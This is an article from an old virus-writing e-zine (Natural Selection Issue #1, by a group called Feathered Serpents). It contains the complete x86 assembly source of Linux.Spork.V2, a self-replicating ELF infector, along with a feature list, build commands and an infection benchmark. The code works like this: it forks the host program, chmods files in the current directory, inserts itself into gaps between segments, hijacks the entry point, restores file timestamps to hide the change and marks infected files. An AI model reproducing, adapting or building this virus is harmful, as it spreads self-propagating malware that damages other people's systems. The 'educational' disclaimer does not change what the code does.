 /* ----------------------------------------------------------------------- )=-
 -=( Natural Selection Issue #1 ---------------------------- Linux.Spork.V2 )=-
 -=( ---------------------------------------------------------------------- )=-

 -=( 0 : Linux.Spork.V2 Features ------------------------------------------ )=-

 Imports:       Nothing
 Infects:       ELF   executables  with   accessible  permissions   in  current
                directory (ie:  r/w group  or other, or file  ownership), strip
                safe
 Locates:       Recursively fills a static buffer with directory information
 Compatability: Linux 2.2 - 2.4+ Kernels [Possibly 2.0 also]
 Saves Stamps:  Of course
 MultiThreaded: Yes,  forks  host  into a  child  process  and  after doing   a
                infection round, sleeps until the  host terminates, and catches
                it,  to return to Linux gracefully
 Polymorphism:  No
 AntiAV / EPO:  Under Linux?  Haw haw :)
 SEH Abilities: No (Linux doesn't crash)
 Payload:       None

 -=( 1 : Linux.Spork.V2 Design Goals -------------------------------------- )=-

 : Create a simple virus to learn Linux assembly language programming
 : Plan a simple  but effective ELF  infection method covering  majority of ELF
   ELF types and is strip safe
 : Mark ELFs that have  been processed but are  unable to be infected,  so that
   they can be skipped in further generations
 : To implement a simple fork() so that the virus runs in a process, while  the
   host does its own thing

 It took  one week  from beginning  using Linux  assembly language  to making a
 working virus from it.  That was  Linux.Spork, which was insanely lost only  a
 few hours after it was finished, to a lightning strike, with no backups.

 There is nothing sadder than outliving your virus, a perfect child that  never
 had a chance to propogate anywhere before it was obliterated.

 However,  after 2  days of  wild coding  later, reconstructing  it just  from
 memory, Linux.Spork V2 rises from the grave to take its place.  FS can rebuild
 you.  Make you better.  Stronger.  Faster.

 -=( 2 : Linux.Spork.V2 Design Faults ------------------------------------- )=-

 Most of the infection time is  probably spent on expanding / truncating  a lot
 of  files, even  if they're  already infected,  this could  be sped  up by  a
 multiple open / close redesign.

 Fork process is not perfect.  If  the virus is the 'child' process,  then when
 the  host  exit()'s  the  virus  could  be  caught  mid-infection  and  end up
 corrupting a file.

 So Linux.Spork V2 spawns the host  as the child process, which means  that its
 Process ID's show up in the listings as seperate threads.

 Also,  if  the  host  finishes before  Linux.Spork  V2  is  finished with  the
 directory,  the  user is  left  waiting until  it's  finished.  This  needs  a
 redesign in the directory handling code.

 -=( 3 : Linux.Spork.V2 Benchmarking -------------------------------------- )=-

 A test was  run to see  what kind of  speed the virus  had in infecting  large
 directories, to  be improved  on in  later families.   A mix  of ELf / non-ELF
 files were copied, and mixed with an infected copy of 'ls'.

 Files           : /usr/bin/[abcde]*
                   215 Files @ 18.064M
 Uninfected LS   : real    0m0.037s
                   user    0m0.030s
                   sys     0m0.000s
 Infected LS 1   : real    0m0.171s
                   user    0m0.110s
                   sys     0m0.020s
 Infected LS 2   : real    0m0.059s
                   user    0m0.010s
                   sys     0m0.030s
 Result          : 149 / 215 Files Infected @ 18.660M


 -=( 4 : Linux.Spork.V2 Disclaimer ---------------------------------------- )=-

 THE CONTENTS OF  THIS ELECTRONIC MAGAZINE  AND ITS ASSOCIATED  SOURCE CODE ARE
 COVERED UNDER THE BELOW TERMS AND CONDITIONS.  IF YOU DO NOT AGREE TO BE BOUND
 BY THESE TERMS AND CONDITIONS, OR  ARE NOT LEGALLY ENTITLED TO AGREE  TO THEM,
 YOU MUST DISCONTINUE USE OF THIS MAGAZINE IMMEDIATELY.

 COPYRIGHT
 Copyright on  materials in  this  magazine  and  the  information  therein and
 their  arrangement is owned by FEATHERED SERPENTS  unless otherwise indicated.

 RIGHTS AND LIMITATIONS
 You have  the  right  to use,    copy and  distribute  the  material in   this
 magazine free   of  charge,  for  all   purposes  allowed  by your   governing
 laws.  You    are expressly  PROHIBITED   from   using the  material contained
 herein  for   any   purposes  that   would   cause    or would    help promote
 the illegal   use of the material.

 NO WARRANTY
 The  information   contained within   this  magazine  are  provided  "as  is".
 FEATHERED    SERPENTS     do    not    warranty    the     accuracy, adequacy,
 or   completeness     of     given  information,  and    expressly   disclaims
 liability   for   errors   or   omissions    contained  therein.   No implied,
 express, or statutory  warranty, is given  in conjunction with  this magazine.

 LIMITATION OF LIABILITY
 In *NO* event will FEATHERED SERPENTS or any of its MEMBERS be liable for  any
 damages  including  and  without  limitation,  direct  or  indirect,  special,
 incidental,  or  consequential  damages,   losses,  or  expenses  arising   in
 connection with this magazine, or the use thereof.

 ADDITIONAL DISCLAIMER
 Computer viruses will spread of their own accord between computer systems, and
 across international boundaries.  They are raw animals with no concern for the
 law, and for that reason your possession of them makes YOU responsible for the
 actions they carry out.

 The viruses provided in this magazine are for educational purposes ONLY.  They
 are NOT intended for use in  ANY WAY outside of strict, controlled  laboratory
 conditions.  If compiled and executed these viruses WILL land you in court(s).

 You will be held responsible for your actions.  As  source code these  viruses
 are  inert  and   covered   by   implied  freedom   of  speech   laws  in some
 countries.  In  binary form  these viruses  are malicious  weapons.  FEATHERED
 SERPENTS do not condone the application of these viruses and will NOT be  held
 LIABLE for any MISUSE.

 -=( 4 : Win32.Imports Compile Instructions ------------------------------- )=-

 as 2.11.90.0.5 and ld 2.11.90.0.5

 as [--gstabs]  -o spork.o  linux.s spork.s
 ld             -o spork            spork.o


 -=( 5 : Linux.Spork.V2 --------------------------------------------------- )*/

.global     _start
.text                               # All hail gas style directives :)

_start:
    # Put a $0 on the stack for us to overwrite later with the entrypoint of
    # the host.  Lots of hosts will rely on the entry registers and flags to
    # determine which Linux kernel they are running under, so we save those.
    #
    pushl   $0
    pushal
    pushfl
    call    _delta

_delta:
    # Calculate our delta offset, then subtract where we are in memory from
    # where we expected to be in memory, to get a relocation value, then we
    # add it to the host entrypoint and overwrite the $0 on the stack so we
    # can return to it later.
    #
    popl    %ebp
    subl    $(_delta - _start), %ebp
    movl    %ebp,               %ebx
    movl    %ebp,               %esi

    subl    $(_start),          %ebp
    subl    file_virus_entrypoint(%ebp),%esi
    addl    file_hosts_entrypoint(%ebp),%esi
    movl    %esi,               (9*4)(%esp)

    # Fork the host out to a copy of this process.  I'm not sure how much of
    # the memory space is 'copied' compared to 'shared', but that should be
    # looked into later.  See the comments for why we fork the host and not
    # the virus.
    #
    # pid_t fork(void);
    #
    movl    $__NR_fork,         %eax
    int     $0x80
    testl   %eax,               %eax
    jz      return
    pushl   %eax

    # As we don't set any section flags [in order to stay anonymous], we'll
    # manually tweak our memory settings so that they're writeable.  Note,
    # that we rarely start on a page boundary, and so we need to change two
    # pages, which we overlap.
    #
    # int mprotect(const void *addr, size_t len, int prot);
    #
    movl    $__NR_mprotect,     %eax
    andl    $0xfffff000,        %ebx
    movl    $(PAGE_SIZE*2),     %ecx
    movl    $(PROT_READ|PROT_WRITE|PROT_EXEC),  %edx
    int     $0x80

    # Open the current directory like a file, so we can use another call to
    # read in file/directory entries stored inside.
    #
    # int open(const char *pathname, int flags);
    #
    movl    $__NR_open,         %eax
    leal    dir_infect(%ebp),   %ebx
    movl    $(O_RDONLY),        %ecx
    int     $0x80
    movl    %eax,               dir_handle(%ebp)

directory_fill:
    # Start / continue filling in our buffer with entries from this directory
    # handle.  We can repeat this call over and over until it returns 0 for a
    # end of directory.
    #
    # int getdents(unsigned int fd, struct dirent *dirp, unsigned int count);
    #
    movl    $__NR_getdents,     %eax
    movl    dir_handle(%ebp),   %ebx
    leal    dir_buffer(%ebp),   %ecx
    movl    $DBUF_SIZE,         %edx
    int     $0x80
    testl   %eax,               %eax
    js      waiter
    jz      waiter
    movl    %eax,               dir_length(%ebp)
    leal    dir_buffer(%ebp),   %ebx

directory_loop:
    # Using the name of this entry in the directory, grab a bunch of status
    # information, then make sure it's a file and not a device or socket or
    # other strange object, before we continue.
    #
    # int stat(const char *file_name, struct stat *buf);
    #
    pushl   %ebx

    movl    $__NR_stat,         %eax
    leal    dirent.d_name(%ebx),%ebx
    leal    file_status(%ebp),  %ecx
    int     $0x80
    testl   %eax,               %eax
    js      directory_next

    testl   $(S_IFREG),         (file_status+stat.st_mode)(%ebp)
    jz      directory_next

    # Here we'll change the status information file mode to give us just the
    # normal flags [which will be used later to restore them with the chmod
    # interrupt], and try to chmod them to o+rw.  If you were anal, we could
    # check to see if we owned the file before we did this, but it will fail
    # harmlessly anyway.
    #
    # int chmod(const char *path, mode_t mode);
    #
    movl    $__NR_chmod,        %eax
    andl    $(S_ISUID|S_ISGID|S_ISVTX|S_IRWXU|S_IRWXG|S_IRWXO), (file_status+stat.st_mode)(%ebp)
    movl    (file_status+stat.st_mode)(%ebp),  %ecx
    orl     $(S_IRUSR|S_IWUSR), %ecx
    int     $0x80

    # Open the file for reading and writing.  Restore attributes if it fails.
    #
    # int open(const char *pathname, int flags);
    #
    pushl   %ebx

    movl    $__NR_open,         %eax
    movl    $(O_RDWR),          %ecx
    int     $0x80
    testl   %eax,               %eax
    js      file_restcmo
    movl    %eax,               %ebx

    # Seek to the end of the file.
    #
    # off_t lseek(int fildes, off_t offset, int whence);
    #
    movl    $__NR_lseek,        %eax
    xorl    %ecx,               %ecx
    movl    $SEEK_END,          %edx
    int     $0x80

    # Append bytes to the file that our virus will fit into if necessary.  We
    # need to do this here, because the mmap call won't expand files for us.
    #
    # ssize_t write(int fd, const void *buf, size_t count);
    #
    movl    $__NR_write,        %eax
    leal    _start(%ebp),       %ecx
    movl    $PAGE_SIZE,         %edx
    int     $0x80
    cmpl    $PAGE_SIZE,         %eax
    jne     file_restore

    # The mmap call takes 6 parameters, so instead of passing with registers
    # we create a structure and fill it in, and pass that instead.  This is
    # changing in the Linux 2.4 kernels I think, but this way will still be
    # supported for a long while yet [I hope].
    #
    # void * mmap(void  *start, size_t length, int prot, int flags, int fd,
    #             off_t offset);
    #
    pushl   %ebx

    movl    (file_status+stat.st_size)(%ebp),   %eax
    addl    $PAGE_SIZE,         %eax
    movl    %eax,               (file_memmap+mmap.length)(%ebp)
    movl    %ebx,               (file_memmap+mmap.fd)(%ebp)

    movl    $__NR_mmap,         %eax
    leal    file_memmap(%ebp),  %ebx
    int     $0x80
    testl   %eax,               %eax
    js      file_truncer

    # Sanity Check #1: Is it an Executable ELF Version 1?
    #
    #
    cmpl    $ELFMAG,            (EI_MAG0)(%eax)
    jne     file_mmunmap
    cmpb    $EV_CURRENT,        (EI_VERSION)(%eax)
    jne     file_mmunmap
    cmpl    $EV_CURRENT,        (Elf32_Ehdr.e_version)(%eax)
    jne     file_mmunmap
    cmpw    $ET_EXEC,           (Elf32_Ehdr.e_type)(%eax)
    jne     file_mmunmap

    # Sanity Check #2: Is it in Intel 32 bit i386 format?
    #
    cmpb    $ELFCLASS32,        (EI_CLASS)(%eax)
    jne     file_mmunmap
    cmpb    $ELFDATA2LSB,       (EI_DATA)(%eax)
    jne     file_mmunmap
    cmpw    $EM_386,            Elf32_Ehdr.e_machine(%eax)
    jne     file_mmunmap

    # Sanity Check #3: Has it been processed or infected?
    #                  If not mark it as being processed.
    #
    # ".NO."    =   0x 2E 4E 4F 2E
    #
    cmpl    $0,                 (EI_PAD)(%eax)
    jne     file_mmunmap
    movl    $0x2e4f4e2e,        (EI_PAD)(%eax)

    # Grab information from the Program Header, and prepare for a loop through
    # each PT_LOAD.
    #
    movl    Elf32_Ehdr.e_phoff(%eax),   %ebx
    movzwl  Elf32_Ehdr.e_phnum(%eax),   %ecx

file_outerph:
    # We only touch PT_LOAD sections as they are the only ones that end up in
    # accessible memory, as far as I'm aware.  We make sure memory and file
    # size are the same so that we aren't overwritten by .bss information but
    # maybe in the future something can be done about that...
    #
    cmpl    $PT_LOAD,                   Elf32_Phdr.p_type(%eax,%ebx)
    jne     file_nextoph
    movl    Elf32_Phdr.p_memsz(%eax,%ebx),  %edx
    cmpl    Elf32_Phdr.p_filesz(%eax,%ebx), %edx
    jne     file_nextoph
    addl    Elf32_Phdr.p_vaddr(%eax,%ebx),  %edx

    # Now we have our suggested virtual address in memory, prepare for the
    # second loop through the Program Header.
    #
    pushl   %ebx
    pushl   %ecx
    movl    Elf32_Ehdr.e_phoff(%eax),   %ebx
    movzwl  Elf32_Ehdr.e_phnum(%eax),   %ecx
    xorl    %edi,                       %edi

file_innerph:
    # Loop through, sorting the PT_LOAD sections and looking for the one
    # that follows on closest from the one selected in the outer loop.
    #
    cmpl    $PT_LOAD,                   Elf32_Phdr.p_type(%eax,%ebx)
    jne     file_nextiph
    cmpl    Elf32_Phdr.p_vaddr(%eax,%ebx),  %edx
    ja      file_nextiph
    cmpl    Elf32_Phdr.p_vaddr(%eax,%ebx),  %edi
    ja      file_nextiph
    movl    %ebx,                           %esi
    movl    Elf32_Phdr.p_vaddr(%eax,%ebx),  %edi

file_nextiph:
    pushl   %eax
    movzwl  Elf32_Ehdr.e_phentsize(%eax),   %eax
    addl    %eax,                           %ebx
    popl    %eax
    loop    file_innerph

    # Make sure we found a following section, although this could also be
    # slightly tweaked to infect 'last' sections, they'd be rare.
    #
    popl    %ecx
    popl    %ebx
    testl   %edi,                           %edi
    jz      file_nextoph

    # If the sections have PAGE_SIZE or more between the end of one and the
    # start of the other, we have space to insert.
    #
    pushl   %edi
    subl    $PAGE_SIZE,                     %edi
    cmpl    %edx,                           %edi
    popl    %edi
    jae     file_matchph

    # Alternatively, if there is less than PAGE_SIZE between the sections,
    # but a load-time PAGE_SIZE alignment between the two, we also have a
    # space to insert to.
    #
    pushl   %edx
    andl    $0xfffff000,                    %edi
    andl    $0xfffff000,                    %edx
    cmpl    %edx,                           %edi
    popl    %edx
    jb      file_nextoph
    cmpl    $PAGE_SIZE,                     Elf32_Phdr.p_align(%eax,%esi)
    je      file_matchph

file_nextoph:
    # Continue looping through the Program Header looking for sections to
    # insert after.  If we don't find any, we'll leave the file and it is
    # truncated at the exit.  Also, we left our ".NO." tag so that it is
    # not attempted for infection again, hopefully saving some time.
    #
    pushl   %eax
    movzwl  Elf32_Ehdr.e_phentsize(%eax),   %eax
    addl    %eax,               %ebx
    popl    %eax
    loop    file_outerph
    jmp     file_mmunmap

file_matchph:
    # Change the file mark to be 'infected'.  Although we could keep it as a
    # 'already processed' mark, this lets me keep track of infected files on
    # my own system.
    #
    # Save the original entrypoint and replace it with ours, then discover
    # the end of this section in the file, and update our section with the
    # new memory and file sizes.
    #
    # ".FS."    =   0x 2E 46 53 2E
    #
    movl    $0x2e53462e,        EI_PAD(%eax)

    pushl   Elf32_Ehdr.e_entry(%eax)
    popl    file_hosts_entrypoint(%ebp)
    movl    %edx,               Elf32_Ehdr.e_entry(%eax)
    movl    %edx,               file_virus_entrypoint(%ebp)

    movl    Elf32_Phdr.p_offset(%eax,%ebx), %edx
    addl    Elf32_Phdr.p_filesz(%eax,%ebx), %edx

    addl    $PAGE_SIZE,         Elf32_Phdr.p_filesz(%eax,%ebx)
    addl    $PAGE_SIZE,         Elf32_Phdr.p_memsz(%eax,%ebx)

file_updatep:
    # Loop through the Program Header and update any file offsets that are
    # equal to or after our insertion point.  Once we are finished, then I
    # do a check to make sure the Program Header itself isn't past us too,
    # in which case we update it also.
    #
    # Updating is just moving things to point 'forward' $PAGE_SIZE bytes.
    #
    movl    Elf32_Ehdr.e_phoff(%eax),   %ebx
    movzwl  Elf32_Ehdr.e_phnum(%eax),   %ecx

0:  cmpl    Elf32_Phdr.p_offset(%eax,%ebx), %edx
    ja      1f
    addl    $PAGE_SIZE,                 Elf32_Phdr.p_offset(%eax,%ebx)
1:  movzwl  Elf32_Ehdr.e_phentsize(%eax),   %esi
    addl    %esi,                       %ebx
    loop    0b

    cmpl    Elf32_Ehdr.e_phoff(%eax),   %edx
    ja      file_updates
    addl    $PAGE_SIZE,                 Elf32_Ehdr.e_phoff(%eax)

file_updates:
    # Do the same thing with the Section Header, updating file offsets of
    # sections as well as the Section Header itself if necessary [and it
    # is almost always necessary].
    #
    movl    Elf32_Ehdr.e_shoff(%eax),   %ebx
    movzwl  Elf32_Ehdr.e_shnum(%eax),   %ecx
    xorl    %edi,                       %edi

0:  # While we are parsing, sort out the section with the highest address
    # in file, before reaching ours [ignore SHT_NOBITS ones, they don't
    # actually count for any file space].
    #
    cmpl    $SHT_NOBITS,                Elf32_Shdr.sh_type(%eax,%ebx)
    je      1f
    cmpl    $0,                         Elf32_Shdr.sh_size(%eax,%ebx)
    je      1f

    cmpl    Elf32_Shdr.sh_offset(%eax,%ebx),%edx
    jbe     1f
    cmpl    Elf32_Shdr.sh_offset(%eax,%ebx),%edi
    ja      1f
    movl    %ebx,                           %esi
    movl    Elf32_Shdr.sh_offset(%eax,%ebx),%edi

1:  cmpl    Elf32_Shdr.sh_offset(%eax,%ebx),%edx
    ja      2f
    addl    $PAGE_SIZE,                 Elf32_Shdr.sh_offset(%eax,%ebx)

2:  pushl   %eax
    movzwl  Elf32_Ehdr.e_shentsize(%eax),   %eax
    addl    %eax,               %ebx
    popl    %eax
    loop    0b

    # If we found a section before ours which can account for spaces in
    # the file space, then we increase it to include us, which makes us
    # strip safe.
    #
    testl   %edi,               %edi
    jz      3f
    addl    $PAGE_SIZE,         Elf32_Shdr.sh_size(%eax,%esi)

3:  cmpl    Elf32_Ehdr.e_shoff(%eax),   %edx
    ja      file_arrange
    addl    $PAGE_SIZE,                 Elf32_Ehdr.e_shoff(%eax)

file_arrange:
    # Move to the end of the original file, and copy every byte that is
    # after our insertion point, to the end of the new file, going all
    # the way backwards to where we will insert.  We have to do it like
    # this so parts of the file don't overwrite itself.
    #
    movl    (file_status+stat.st_size)(%ebp),   %ecx

    leal    (PAGE_SIZE-1)(%eax,%ecx),   %edi
    leal    -1(%eax,%ecx),              %esi
    subl    %edx,                       %ecx

    std
    rep     movsb

    # Now insert the virus.  We could save a few bytes in both of these rep
    # movsb calls, but we kept it like this for clarity to see what's going
    # on.
    #
    movl    $PAGE_SIZE,                 %ecx
    leal    _start(%ebp),               %esi
    leal    (%eax,%edx),                %edi
    cld
    rep     movsb

    # Add the size of the virus to the size used to truncate the file in a
    # moment.  This way, we aren't cut out.
    #
    addl    $PAGE_SIZE,         (file_status+stat.st_size)(%ebp)

file_mmunmap:
    # Commit the whole memory map to file.  Note that if we didn't write the
    # $PAGE_SIZE bytes to the end before we mapped, these bytes be lost with
    # no warning.  I learned that the hard way.  Damn you POSIX.
    #
    # int munmap(void *start, size_t length);
    #
    movl    $__NR_munmap,       %ebx
    xchg    %ebx,               %eax
    movl    (file_memmap+mmap.length)(%ebp),    %ecx
    int     $0x80

file_truncer:
    # Truncate file to appropriate size.  That is, either the original size,
    # or the modified new size if we infected the file.
    #
    # int ftruncate(int fd, off_t length);
    #
    popl    %ebx

    movl    $__NR_ftruncate,    %eax
    movl    (file_status+stat.st_size)(%ebp),   %ecx
    int     $0x80

file_restore:
    # Close the file handle.
    #
    # int close(int fd);
    #
    movl    $__NR_close,        %eax
    int     $0x80

file_restcmo:
    # Restore the time and date stamps.  There is one more stamp, the ctime
    # or changetime stamp, which can't be changed from user mode as far as
    # I know.
    #
    # int utime(const char *filename, struct utimbuf *buf);
    #
    popl    %ebx

    movl    $__NR_utime,        %eax
    pushl   (file_status+stat.st_atime)(%ebp)
    pushl   (file_status+stat.st_mtime)(%ebp)
    popl    (file_stamps+utimbuf.modtime)(%ebp)
    popl    (file_stamps+utimbuf.actime)(%ebp)
    leal    file_stamps(%ebp),  %ecx
    int     $0x80

    # Reset the file attributes to their original values.  Note that we've
    # already AND'd out evil bits from the file_status structure.
    #
    # int chmod(const char *path, mode_t mode);
    #
    movl    $__NR_chmod,        %eax
    movl    (file_status+stat.st_mode)(%ebp),   %ecx
    int     $0x80

directory_next:
    # Point us to the next entry in our directory buffer.  We keep a track
    # of how many bytes we've processed to how many bytes were originally
    # filled in.  If we run out of data, we return to the getdents routine
    # to refill the buffer.
    #
    popl    %ebx
    movzwl  dirent.d_reclen(%ebx),  %eax
    addl    %eax,               %ebx
    subl    %eax,               dir_length(%ebp)
    jnz     directory_loop
    jmp     directory_fill

waiter:
    # Wait until the host finishes executing.  We saved the PID from the
    # wait call, otherwise we might find ourselves exiting when any other
    # child processes of the host finish.
    #
    # pid_t waitpid(pid_t pid, int *status, int options);
    #
    movl    $__NR_waitpid,      %eax
    popl    %ebx
    xorl    %ecx,               %ecx
    xorl    %edx,               %edx
    int     $0x80

_hosts:
    # Exit manually with the error/success code returned from the host.
    # See, viruses aren't destructive ;)  This also doubles as our first
    # generation host, ie: just an exit call.
    #
    # void _exit(int status);
    #
    movl    $__NR_exit,         %ebx
    xchgl   %ebx,               %eax
    int     $0x80

return:
    # This is never reached by the above code, only the fork() will get
    # here, popping the flags and registers off the stack and then it
    # will ret to the host address on the stack.
    #
    popfl
    popal
    ret

                        .set    DBUF_SIZE,  0x500
dir_infect:             .asciz  "."
dir_buffer:             .fill   DBUF_SIZE
dir_length:             .long   0
dir_handle:             .long   0

file_status:            .fill   stat_size
file_memmap:            .long   0,0, (PROT_READ|PROT_WRITE), (MAP_SHARED), 0,0
file_stamps:            .fill   utimbuf_size

file_virus_entrypoint:  .long   _start
file_hosts_entrypoint:  .long   _hosts

    .asciz  "[Linux.Spork.V2] Still not a perfect fork, yet :)"
    .asciz  "(c) 2001 of Feathered Serpents. Replicate freely."

    .fill   0x1000              # Extra space to make sure the virus is at
                                # least PAGE_SIZE

 /*( ---------------------------------------------------------------------- )=-
 -=( Natural Selection Issue #1 --------------- (c) 2002 Feathered Serpents )=-
 -=( ---------------------------------------------------------------------- )*/
